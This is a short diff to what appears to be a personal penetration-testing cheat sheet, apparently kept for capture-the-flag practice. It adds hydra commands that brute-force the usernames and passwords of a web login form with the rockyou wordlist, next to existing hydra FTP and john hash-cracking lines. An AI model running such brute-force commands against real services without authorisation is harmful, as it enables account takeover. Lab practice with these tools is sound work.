@@ -10,6 +10,9 @@ OR
 echo '123414' | base64 -d
 🗲
 hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.97.223 ftp
+---
+hydra -L /usr/share/wordlists/rockyou.txt -p test example.com https-post-form "/login:username=^USER^&password=^PASS^:Invalid username" -> username brute force
+hydra -l hacker -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login:username=^USER^&password=^PASS^:Invalid username" -> password brute force
 🗲
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 🗲
